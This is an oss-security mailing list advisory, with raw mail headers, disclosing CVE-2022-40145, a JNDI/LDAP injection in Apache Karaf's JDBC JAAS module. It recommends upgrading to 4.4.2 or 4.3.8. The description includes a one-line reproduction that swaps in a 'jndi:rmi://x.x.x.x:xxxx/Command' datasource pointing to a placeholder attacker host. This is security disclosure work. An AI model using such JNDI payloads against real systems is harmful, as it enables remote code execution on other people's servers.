Received: (qmail 32045 invoked by uid 550); 21 Dec 2022 15:57:29 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25876 invoked from network); 21 Dec 2022 15:53:40 -0000
Authentication-Results: apache.org; auth=none
Content-Type: text/plain; charset=utf-8
From: =?UTF-8?Q?Jean-Baptiste_Onofr=C3=A9?= <jbonofre@apache.org>
To: oss-security@lists.openwall.com
Message-ID: <1e60267c-edf3-05bc-4e36-78ebe5889664@apache.org>
Content-Transfer-Encoding: quoted-printable
Date: Wed, 21 Dec 2022 15:53:26 +0000
MIME-Version: 1.0
Subject: [oss-security] CVE-2022-40145: Apache Karaf: JDBC JAAS LDAP injection 

Severity: low

Description:

This vulnerable is about a potential code injection when an attacker has co=
ntrol of the target LDAP server using in the JDBC JNDI URL.

The function jaas.modules.src.main.java.porg.apache.karaf.jass.modules.jdbc=
.JDBCUtils#doCreateDatasource
use InitialContext.lookup(jndiName) without filtering.
An user can modify=C2=A0`options.put(JDBCUtils.DATASOURCE, "osgi:" +=C2=A0D=
ataSource.class.getName());` to `options.put(JDBCUtils.DATASOURCE,"jndi:rmi=
://x.x.x.x:xxxx/Command");` in JdbcLoginModuleTest#setup.

This is vulnerable to a remote code execution (RCE) attack when a
configuration uses a JNDI LDAP data source URI when an attacker has
control of the target LDAP server.This issue affects all versions of Apache=
 Karaf up to 4.4.1 and 4.3.7.

We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8

This issue is being tracked as KARAF-7568=20

Credit:

Xun Bai <bbbbear68@gmail.com> (reporter)

References:

https://karaf.apache.org/security/cve-2022-40145.txt
https://karaf.apache.org/
https://www.cve.org/CVERecord?id=3DCVE-2022-40145
https://issues.apache.org/jira/browse/KARAF-7568

